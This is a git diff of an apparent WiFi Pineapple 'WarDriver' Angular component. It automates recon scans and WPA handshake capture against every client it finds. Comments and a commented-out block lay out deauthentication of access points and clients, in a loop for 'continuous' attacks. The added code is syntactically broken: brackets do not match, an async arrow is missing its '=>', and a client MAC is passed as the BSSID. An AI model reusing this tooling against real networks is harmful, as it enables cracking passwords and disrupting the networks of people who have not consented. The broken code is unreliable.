@@ -158,8 +158,6 @@ export class WarDriverComponent implements OnInit {
 }
 
     ngOnInit() { 
-        //this.populateTargetBSSIDs();
-        //this.get_status();
         const pineAP_aggro_settings = {
             'mode': 'advanced', 
             'settings': { 
@@ -207,20 +205,96 @@ export class WarDriverComponent implements OnInit {
             return startReconResp;
         }
 
+        const startHandshakeCapture = async (client_mac: string) => {
+            const handshakeCapturePayload = { 
+                bssid: client_mac,
+                channel: 11
+            }
+            const startHandshakeCaptureResp: any = await this.API.APIPostAsync('/api/pineap/handshakes/start', handshakeCapturePayload);
+            return startHandshakeCaptureResp;
+        }
         
+        const getReconStatusById = async (scanID: number) {
+            const getReconStatusByIdResp: any = await this.API.APIGetAsync('/api/recon/scans/'+ scanID);
+            return getReconStatusByIdResp;
+        }
+
+        let scanID: number;
         getReconStatus().then((reconResp) => { // get status of recon scan
                 if (reconResp.scanRunning) { // if recon is running, stop it
                     stopRecon().then(() => {
                         setSettings().then(() => { // set pineAP settings
                             startRecon().then((startResp) => { // start recon
                                 if (startResp.scanRunning) {
-                                    console.log('>scan running. id: ' +startResp.scanID)
+                                    console.log('>scan running. id: ' +startResp.scanID);
+                                    scanID = startResp.scanID;                                   
+                                    setTimeout(() => { // run recon for x seconds
+                                        stopRecon().then((stopReconResponse) => { // stop recon
+                                            if (stopReconResponse.success) {
+                                                getReconStatusById(scanID).then((reconScanResults) => {  // get recon scan results
+                                                    if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
+                                                        // loop through APs
+                                                        reconScanResults.APResults.forEach((ap) => {
+                                                            // if any have clients, loop through clients
+                                                            if (ap.APResults.clients.length > 0) {
+                                                                ap.APResults.clients.forEach((client) => {
+                                                                    // start handshake
+                                                                    startHandshakeCapture(client.client_mac).then(() => {
+                                                                        
+                                                                    } // deauth
+                                                                });
+                                                            }
+                                                        })
+
+                                                        // deauth clients
+                                                        // deauth AP
+                                                        // wait 20 secs for cleanup
+                                                        // check for handshake
+                                                        // if handshake, send notification
+                                                        // move to next AP with clients
+                                                        // ...
+                                                        // if continuousDeauth, do it all over
+                                                    }
+                                                }); 
+                                            }
+                                        });
+                                        //startHandshakeCapture().then((handshakeCapture) => {
+                                          //  if (handshakeCapture != null)
+                                        }
+                                        );
+                                        });
+                                    }, 31000);
                                 }
                             });
                     });
                 });
             }
         });
-        
     } 
 }
+
+/*, (resp) => {  // start handshake capture
+                if (resp.handshakes != null) {
+                    scanResultsArray.forEach(ap => { // loop through APs
+                        let ap_deauth_payload = { // build ap deauth payload
+                            bssid: ap.bssid,
+                            multiplier: 1,
+                            channel: 11,
+                            clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
+                        }
+                        this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, (resp) => {  // deauth the ap
+                            console.log('>ap deauthd: ' +ap.bssid)
+                        }).forEach(client => { // loop through clients
+                            let client_deauth_payload = { // build client deauth payload
+                                bssid: ap.bssid,
+                                mac: client.client_mac,
+                                multiplier: 1,
+                                channel: 11
+                            }
+                            this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, (resp) => { // deauth a client
+                                console.log('>deauthd: ' +client.client_mac);
+                            });
+                        });
+                    });
+                }
+            });*/
